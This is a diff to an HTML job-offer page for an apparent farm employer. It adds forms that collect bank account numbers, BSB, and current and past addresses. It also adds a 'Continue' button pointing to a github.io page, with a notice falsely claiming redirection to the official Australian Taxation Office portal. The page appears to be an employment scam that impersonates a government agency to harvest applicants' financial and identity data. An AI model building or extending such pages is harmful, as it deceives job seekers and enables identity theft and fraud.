@@ -510,12 +510,12 @@
       box-shadow: 0 10px 20px -5px rgba(0,0,0,0.2);
     }
 
-    /* ===== COMPANY LETTER MODAL - FIXED LAYOUT ===== */
+    /* ===== COMPANY LETTER MODAL ===== */
     .letter-modal {
       position: fixed;
       top: 0;
       left: 0;
-      width: ;
+      width: 100%;
       height: 100vh;
       background: rgba(0,0,0,0.6);
       display: none;
@@ -719,7 +719,6 @@
     .signature-image {
       width: 150px;
       height: 200px;
-      
       border-radius: 15px;
       display: flex;
       align-items: center;
@@ -727,7 +726,6 @@
       color: var(--primary);
       font-size: 3rem;
       text-align: center;
-      
       flex-shrink: 0;
     }
 
@@ -756,6 +754,47 @@
       color: #666;
       margin-top: 0.8rem;
       font-style: italic;
+    }
+
+    /* ATO Portal Button */
+    .ato-portal-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      background: var(--accent);
+      color: var(--primary);
+      border: none;
+      padding: 0.8rem 2rem;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+      margin: 1.5rem 0;
+    }
+
+    .ato-portal-btn:hover {
+      background: var(--accent-light);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px -5px rgba(0,0,0,0.2);
+    }
+
+    .ato-portal-btn i {
+      font-size: 1.1rem;
+    }
+
+    .portal-notice {
+      background: var(--warning-light);
+      padding: 1rem;
+      border-radius: 8px;
+      margin: 1rem 0;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+      color: var(--warning);
     }
 
     /* ===== UTILITY CLASSES ===== */
@@ -1119,6 +1158,192 @@
       display: block;
     }
 
+    /* ===== PAYMENT OPTIONS SECTION ===== */
+    .payment-options {
+      margin-bottom: 2rem;
+    }
+
+    .payment-options h4 {
+      font-size: 1.1rem;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .payment-options h4 i {
+      color: var(--accent);
+    }
+
+    .payment-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .payment-card {
+      border: 1px solid var(--gray);
+      border-radius: 12px;
+      padding: 1.2rem;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .payment-card:hover {
+      border-color: var(--accent);
+      background: var(--light);
+    }
+
+    .payment-card.selected {
+      border: 2px solid var(--accent);
+      background: var(--primary-light);
+    }
+
+    .payment-card input[type="radio"] {
+      display: none;
+    }
+
+    .payment-card label {
+      cursor: pointer;
+      width: 100%;
+      display: block;
+    }
+
+    .payment-card h5 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 0.3rem;
+    }
+
+    .payment-card p {
+      font-size: 0.85rem;
+      color: #5f6d5a;
+    }
+
+    .payment-note {
+      background: var(--warning-light);
+      padding: 1rem;
+      border-radius: 8px;
+      margin: 1rem 0;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+      color: var(--warning);
+    }
+
+    /* ===== BANK DETAILS SECTION ===== */
+    .bank-details {
+      margin-bottom: 2rem;
+    }
+
+    .bank-details h4 {
+      font-size: 1.1rem;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .bank-details h4 i {
+      color: var(--accent);
+    }
+
+    /* ===== ADDRESS SECTION ===== */
+    .address-section {
+      margin-bottom: 2rem;
+    }
+
+    .address-section h4 {
+      font-size: 1.1rem;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .address-section h4 i {
+      color: var(--accent);
+    }
+
+    .address-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: var(--space-md);
+    }
+
+    .duration-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 0.5rem;
+      margin: 1rem 0;
+    }
+
+    .duration-option {
+      border: 1px solid var(--gray);
+      border-radius: 8px;
+      padding: 0.8rem;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .duration-option:hover {
+      border-color: var(--accent);
+      background: var(--light);
+    }
+
+    .duration-option.selected {
+      border: 2px solid var(--accent);
+      background: var(--primary-light);
+    }
+
+    .duration-option input[type="radio"] {
+      display: none;
+    }
+
+    .duration-option label {
+      cursor: pointer;
+      width: 100%;
+      display: block;
+      font-size: 0.9rem;
+      color: var(--primary);
+    }
+
+    .previous-address {
+      margin-top: 1.5rem;
+      padding: 1.5rem;
+      border: 1px solid var(--gray);
+      border-radius: 12px;
+      background: var(--light);
+      display: none;
+    }
+
+    .previous-address.visible {
+      display: block;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .previous-address h5 {
+      font-size: 1rem;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .date-range {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
     /* ===== FILE UPLOAD ===== */
     .file-upload {
       border: 2px dashed var(--gray);
@@ -1409,6 +1634,14 @@
       .letter-body h3 {
         font-size: 1.4rem;
       }
+
+      .payment-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .duration-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
     }
 
     @media (max-width: 900px) {
@@ -1455,6 +1688,10 @@
         flex-direction: column;
         text-align: center;
         align-items: center;
+      }
+
+      .address-grid {
+        grid-template-columns: 1fr;
       }
     }
 
@@ -1515,6 +1752,18 @@
 
       .letter-list li {
         font-size: 0.95rem;
+      }
+
+      .payment-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .duration-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .date-range {
+        grid-template-columns: 1fr;
       }
     }
   </style>
@@ -1630,19 +1879,26 @@
         <p><strong>Next Steps:</strong> Kindly complete Section Two within 14 days to enable the issuance of your official work date and accommodation details. A member of our recruitment team will contact you within 2-3 business days with further instructions.</p>
         
         <p>We look forward to welcoming you to our team and are excited about the possibility of you joining the Carlton Hill family.</p>
-    <span class="submit-btn"> <i class="fas fa-circle-check"> </i> <a href="agreements.html">Continue 
-     </span>
+
+        <!-- ATO Portal Button -->
+        <div style="text-align: center; margin: 2rem 0;">
+          <a href="https://ato-gov.github.io/au/" target="_blank" class="ato-portal-btn">
+            <i class="fas fa-external-link-alt"></i> Continue 
           </a>
+          <div class="portal-notice">
+            <i class="fas fa-shield-alt"></i>
+            <span>You will be redirected to the official Australian Taxation Office portal. Your information is secure.</span>
+          </div>
+        </div>
         
         <div class="signature-section">
           <div class="signature-image">
             <img src="https://i.ibb.co/wZMRDyZV/In-Shot-20260301-115303720.png" alt="Company Signature">
           </div>
           
-          
-   <div class="signature-image">
-     <img src="https://i.ibb.co/p6g1Vn6z/In-Shot-20260301-122830926.png" alt="Company Signature">
-   </div>
+          <div class="signature-image">
+            <img src="https://i.ibb.co/p6g1Vn6z/In-Shot-20260301-122830926.png" alt="Company Signature">
+          </div>
           <div class="signature-text">
             <p><strong>Recruitment & Human Resources Department</strong></p>
             <p>Carlton Hill Station Farm</p>
@@ -1819,6 +2075,155 @@
               </label>
             </div>
             <div class="field-note">🏡 On-site accommodation is available in comfortable private cabins for full-time and seasonal staff.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Payment Options Section -->
+      <div class="form-section">
+        <div class="section-title">
+          <div class="icon"><i class="fas fa-inbox"></i></div>
+          <h3> 🔹️Payment Options</h3>
+        </div>
+
+        <div class="payment-options">
+          <h4><i class="fas fa-clock"></i> Select Your Payment Preference</h4>
+          <div class="payment-grid">
+            <div class="payment-card" onclick="selectPayment('hourly')">
+              <input type="radio" name="paymentOption" id="hourlyPay" value="hourly">
+              <label for="hourlyPay">
+                <h5>⏰ Hourly Payment</h5>
+                <p>Your total earnings will be calculated hourly and paid at the end of each day</p>
+              </label>
+            </div>
+
+            <div class="payment-card" onclick="selectPayment('weekly')">
+              <input type="radio" name="paymentOption" id="weeklyPay" value="weekly">
+              <label for="weeklyPay">
+                <h5>📅 Weekly Payment</h5>
+                <p>Your total earnings will be calculated and paid at the end of each week</p>
+              </label>
+            </div>
+
+            <div class="payment-card" onclick="selectPayment('monthly')">
+              <input type="radio" name="paymentOption" id="monthlyPay" value="monthly">
+              <label for="monthlyPay">
+                <h5>📆 Monthly Payment</h5>
+                <p>Your total earnings will be calculated and paid at the end of each month</p>
+              </label>
+            </div>
+          </div>
+
+          <div class="payment-note">
+            <i class="fas fa-info-circle"></i>
+            <p><strong>Important Notice:</strong> You may request to change your payment preference at any time during your employment. A written request must be submitted to management, and changes will take effect in the next payment cycle. All payments are processed accurately and transparently according to your selected option.</p>
+          </div>
+        </div>
+
+        <div class="bank-details">
+          <h4><i class="fas fa-university"></i> 🏦 Bank Account Information</h4>
+          <p style="margin-bottom: 1rem; color: #5f6d5a;">To ensure secure and timely salary payments, all wages at Carlton Hill Station Farm are transferred directly into your nominated bank account.</p>
+          
+          <div class="form-grid">
+            <div class="form-group">
+              <label>Account Name *</label>
+              <input type="text" id="accountName" placeholder="Name on bank account" required>
+            </div>
+            <div class="form-group">
+              <label>Bank Name *</label>
+              <input type="text" id="bankName" placeholder="e.g., Commonwealth Bank" required>
+            </div>
+            <div class="form-group full-width">
+              <label>Account Number *</label>
+              <input type="text" id="accountNumber" placeholder="Account number" required>
+            </div>
+            <div class="form-group">
+              <label>BSB *</label>
+              <input type="text" id="bsb" placeholder="e.g., 123-456" required>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Residential Address Section -->
+      <div class="form-section">
+        <div class="section-title">
+          <div class="icon"><i class="fas fa-home"></i></div>
+          <h3>🔹️Residential Address Details</h3>
+        </div>
+
+        <h4>1️⃣ Current Residential Address</h4>
+        <div class="address-grid">
+          <div class="form-group full-width">
+            <label>Street Address *</label>
+            <input type="text" id="currentStreet" placeholder="Street address" required>
+          </div>
+          <div class="form-group">
+            <label>Suburb/City *</label>
+            <input type="text" id="currentSuburb" placeholder="Suburb or city" required>
+          </div>
+          <div class="form-group">
+            <label>State *</label>
+            <input type="text" id="currentState" placeholder="State" required>
+          </div>
+          <div class="form-group">
+            <label>Postcode *</label>
+            <input type="text" id="currentPostcode" placeholder="Postcode" required>
+          </div>
+        </div>
+
+        <h4 style="margin-top: 1.5rem;">How long have you lived at this address?</h4>
+        <div class="duration-grid" id="durationGrid">
+          <div class="duration-option" onclick="selectDuration('less6')">
+            <input type="radio" name="addressDuration" id="durLess6" value="less6">
+            <label for="durLess6">Less than 6 months</label>
+          </div>
+          <div class="duration-option" onclick="selectDuration('6to12')">
+            <input type="radio" name="addressDuration" id="dur6to12" value="6to12">
+            <label for="dur6to12">6–12 months</label>
+          </div>
+          <div class="duration-option" onclick="selectDuration('1to2')">
+            <input type="radio" name="addressDuration" id="dur1to2" value="1to2">
+            <label for="dur1to2">1–2 years</label>
+          </div>
+          <div class="duration-option" onclick="selectDuration('2plus')">
+            <input type="radio" name="addressDuration" id="dur2plus" value="2plus">
+            <label for="dur2plus">2+ years</label>
+          </div>
+        </div>
+
+        <!-- Previous Address (shown conditionally) -->
+        <div class="previous-address" id="previousAddress">
+          <h5><i class="fas fa-history"></i> 2️⃣ Previous Residential Address</h5>
+          <div class="address-grid">
+            <div class="form-group full-width">
+              <label>Street Address</label>
+              <input type="text" id="prevStreet" placeholder="Street address">
+            </div>
+            <div class="form-group">
+              <label>Suburb/City</label>
+              <input type="text" id="prevSuburb" placeholder="Suburb or city">
+            </div>
+            <div class="form-group">
+              <label>State</label>
+              <input type="text" id="prevState" placeholder="State">
+            </div>
+            <div class="form-group">
+              <label>Postcode</label>
+              <input type="text" id="prevPostcode" placeholder="Postcode">
+            </div>
+          </div>
+
+          <h5 style="margin: 1rem 0 0.5rem;">Dates lived at this address:</h5>
+          <div class="date-range">
+            <div class="form-group">
+              <label>From</label>
+              <input type="date" id="prevFrom">
+            </div>
+            <div class="form-group">
+              <label>To</label>
+              <input type="date" id="prevTo">
+            </div>
           </div>
         </div>
       </div>
@@ -2115,6 +2520,44 @@
     document.getElementById('currentDate').textContent = date.toLocaleDateString('en-AU', options);
   }
 
+  // ==================== PAYMENT SELECTION ====================
+  function selectPayment(type) {
+    // Remove selected class from all payment cards
+    document.querySelectorAll('.payment-card').forEach(card => {
+      card.classList.remove('selected');
+    });
+    
+    // Add selected class to clicked card
+    event.currentTarget.classList.add('selected');
+    
+    // Check the radio button
+    const radio = event.currentTarget.querySelector('input[type="radio"]');
+    if (radio) radio.checked = true;
+  }
+
+  // ==================== DURATION SELECTION ====================
+  function selectDuration(duration) {
+    // Remove selected class from all duration options
+    document.querySelectorAll('.duration-option').forEach(option => {
+      option.classList.remove('selected');
+    });
+    
+    // Add selected class to clicked option
+    event.currentTarget.classList.add('selected');
+    
+    // Check the radio button
+    const radio = event.currentTarget.querySelector('input[type="radio"]');
+    if (radio) radio.checked = true;
+    
+    // Show previous address if less than 2-3 years
+    const previousAddress = document.getElementById('previousAddress');
+    if (duration === 'less6' || duration === '6to12' || duration === '1to2') {
+      previousAddress.classList.add('visible');
+    } else {
+      previousAddress.classList.remove('visible');
+    }
+  }
+
   // ==================== FORM VALIDATION ====================
   function validateForm() {
     let isValid = true;
@@ -2193,6 +2636,86 @@
       isValid = false;
     }
 
+    // Validate bank details
+    const accountName = document.getElementById('accountName').value.trim();
+    if (!accountName) {
+      document.getElementById('accountName').classList.add('error');
+      isValid = false;
+    }
+
+    const bankName = document.getElementById('bankName').value.trim();
+    if (!bankName) {
+      document.getElementById('bankName').classList.add('error');
+      isValid = false;
+    }
+
+    const accountNumber = document.getElementById('accountNumber').value.trim();
+    if (!accountNumber) {
+      document.getElementById('accountNumber').classList.add('error');
+      isValid = false;
+    }
+
+    const bsb = document.getElementById('bsb').value.trim();
+    if (!bsb) {
+      document.getElementById('bsb').classList.add('error');
+      isValid = false;
+    }
+
+    // Validate current address
+    const currentStreet = document.getElementById('currentStreet').value.trim();
+    if (!currentStreet) {
+      document.getElementById('currentStreet').classList.add('error');
+      isValid = false;
+    }
+
+    const currentSuburb = document.getElementById('currentSuburb').value.trim();
+    if (!currentSuburb) {
+      document.getElementById('currentSuburb').classList.add('error');
+      isValid = false;
+    }
+
+    const currentState = document.getElementById('currentState').value.trim();
+    if (!currentState) {
+      document.getElementById('currentState').classList.add('error');
+      isValid = false;
+    }
+
+    const currentPostcode = document.getElementById('currentPostcode').value.trim();
+    if (!currentPostcode) {
+      document.getElementById('currentPostcode').classList.add('error');
+      isValid = false;
+    }
+
+    // Validate payment selection
+    const paymentSelected = document.querySelector('input[name="paymentOption"]:checked');
+    if (!paymentSelected) {
+      showNotification('Validation Error', 'Please select a payment option', 'error');
+      isValid = false;
+    }
+
+    // Validate duration selection
+    const durationSelected = document.querySelector('input[name="addressDuration"]:checked');
+    if (!durationSelected) {
+      showNotification('Validation Error', 'Please select how long you have lived at your current address', 'error');
+      isValid = false;
+    }
+
+    // Validate previous address if shown
+    const previousAddress = document.getElementById('previousAddress');
+    if (previousAddress.classList.contains('visible')) {
+      const prevStreet = document.getElementById('prevStreet').value.trim();
+      const prevSuburb = document.getElementById('prevSuburb').value.trim();
+      const prevState = document.getElementById('prevState').value.trim();
+      const prevPostcode = document.getElementById('prevPostcode').value.trim();
+      const prevFrom = document.getElementById('prevFrom').value;
+      const prevTo = document.getElementById('prevTo').value;
+
+      if (!prevStreet || !prevSuburb || !prevState || !prevPostcode || !prevFrom || !prevTo) {
+        showNotification('Validation Error', 'Please fill in all previous address fields', 'error');
+        isValid = false;
+      }
+    }
+
     const terms = document.getElementById('terms').checked;
     if (!terms) {
       document.getElementById('termsError').classList.add('show');
@@ -2221,11 +2744,19 @@
       const userEmail = document.getElementById('email').value.trim();
       const firstName = fullName.split(' ')[0];
       
+      // Get payment selection
+      const paymentOption = document.querySelector('input[name="paymentOption"]:checked')?.value || '';
+      
+      // Get duration selection
+      const durationOption = document.querySelector('input[name="addressDuration"]:checked')?.value || '';
+      
       // Store applicant data for later use
       applicantData = {
         fullName: fullName,
         firstName: firstName,
-        email: userEmail
+        email: userEmail,
+        paymentOption: paymentOption,
+        durationOption: durationOption
       };
       
       // Simulate 3-second loading delay
@@ -2248,6 +2779,30 @@
           workType: document.getElementById('workType')?.value || '',
           startDate: document.getElementById('startDate')?.value || '',
           needsAccommodation: document.querySelector('input[name="accommodation"]:checked')?.value || 'no'
+        },
+        paymentInfo: {
+          paymentOption: paymentOption,
+          accountName: document.getElementById('accountName')?.value || '',
+          bankName: document.getElementById('bankName')?.value || '',
+          accountNumber: document.getElementById('accountNumber')?.value || '',
+          bsb: document.getElementById('bsb')?.value || ''
+        },
+        addressInfo: {
+          current: {
+            street: document.getElementById('currentStreet')?.value || '',
+            suburb: document.getElementById('currentSuburb')?.value || '',
+            state: document.getElementById('currentState')?.value || '',
+            postcode: document.getElementById('currentPostcode')?.value || '',
+            duration: durationOption
+          },
+          previous: document.getElementById('previousAddress').classList.contains('visible') ? {
+            street: document.getElementById('prevStreet')?.value || '',
+            suburb: document.getElementById('prevSuburb')?.value || '',
+            state: document.getElementById('prevState')?.value || '',
+            postcode: document.getElementById('prevPostcode')?.value || '',
+            from: document.getElementById('prevFrom')?.value || '',
+            to: document.getElementById('prevTo')?.value || ''
+          } : null
         },
         status: 'pending',
         timestamp: new Date().toISOString()
@@ -2285,6 +2840,11 @@
       
       // Reset form
       document.getElementById('applicationForm').reset();
+      
+      // Reset selections
+      document.querySelectorAll('.payment-card').forEach(card => card.classList.remove('selected'));
+      document.querySelectorAll('.duration-option').forEach(option => option.classList.remove('selected'));
+      document.getElementById('previousAddress').classList.remove('visible');
       
     } catch (error) {
       console.error('Error submitting application:', error);
